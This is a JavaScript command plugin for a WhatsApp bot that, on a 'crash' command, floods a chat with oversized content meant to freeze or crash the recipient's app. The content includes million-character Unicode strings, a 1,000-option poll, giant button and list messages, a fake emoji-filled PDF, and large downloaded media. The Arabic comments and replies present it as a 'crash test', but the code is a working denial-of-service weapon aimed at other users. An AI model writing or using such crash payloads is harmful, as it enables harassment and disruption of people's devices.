const fs = require("fs");
const path = require("path");
const axios = require("axios");

module.exports = async ({ sock, msg, text, reply }) => {
    if (!text.startsWith("crash")) return;

    const jid = msg.key.remoteJid;

    try {
        await reply("⚠️ جاري تنفيذ أقوى اختبار... قد ينهار واتساب!");

        // 1️⃣ رسالة Unicode ضخمة جدًا تسبب بطء في العرض
        const heavyText = "𒀱".repeat(1000000) + "💥".repeat(500000);
        await sock.sendMessage(jid, { text: heavyText });

        // 2️⃣ إرسال استطلاع (Poll) ضخم
        await sock.sendMessage(jid, {
            poll: {
                name: "🔥 اختبار الانهيار - اختر خيار",
                values: Array(1000).fill("💥 كراش"),
                selectableCount: 1
            }
        });

        // 3️⃣ أزرار Buttons مع نص ثقيل
        const buttons = [
            { buttonId: "id1", buttonText: { displayText: "🔥" }, type: 1 },
            { buttonId: "id2", buttonText: { displayText: "💥" }, type: 1 }
        ];
        await sock.sendMessage(jid, {
            text: "كراش أزرار".repeat(10000),
            footer: "🔥 اختبار",
            buttons,
            headerType: 1
        });

        // 4️⃣ إرسال قائمة ضخمة جدًا (ListMessage)
        const sections = [];
        for (let i = 0; i < 200; i++) {
            sections.push({
                title: `القسم ${i}`,
                rows: Array(20).fill({ title: "💥", rowId: `opt_${i}` })
            });
        }
        await sock.sendMessage(jid, {
            text: "قائمة ضخمة جدًا",
            buttonText: "اضغط هنا",
            sections
        });

        // 5️⃣ إرسال صورة ضخمة
        const imgUrl = "https://upload.wikimedia.org/wikipedia/commons/3/3f/Fronalpstock_big.jpg"; // 8MB
        const imgBuffer = (await axios.get(imgUrl, { responseType: "arraybuffer" })).data;
        await sock.sendMessage(jid, {
            image: imgBuffer,
            caption: "🔥 صورة ضخمة"
        });

        // 6️⃣ إرسال ملف PDF ضخم جدًا
        const pdfPath = path.join(__dirname, "heavy.pdf");
        if (!fs.existsSync(pdfPath)) {
            const bigData = "📄".repeat(5000000); // PDF ثقيل جدًا
            fs.writeFileSync(pdfPath, bigData);
        }
        await sock.sendMessage(jid, {
            document: fs.readFileSync(pdfPath),
            mimetype: "application/pdf",
            fileName: "Crash_Test.pdf"
        });

        // 7️⃣ إرسال فيديو ثقيل (اختياري)
        const videoUrl = "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_10mb.mp4";
        const videoBuffer = (await axios.get(videoUrl, { responseType: "arraybuffer" })).data;
        await sock.sendMessage(jid, {
            video: videoBuffer,
            caption: "🎥 فيديو اختبار"
        });

        await reply("✅ تم إرسال أقوى اختبار كراش! ⚠️");

    } catch (error) {
        console.error("Crash Test Error:", error);
        await reply("❌ حدث خطأ أثناء تنفيذ الاختبار.");
    }
};
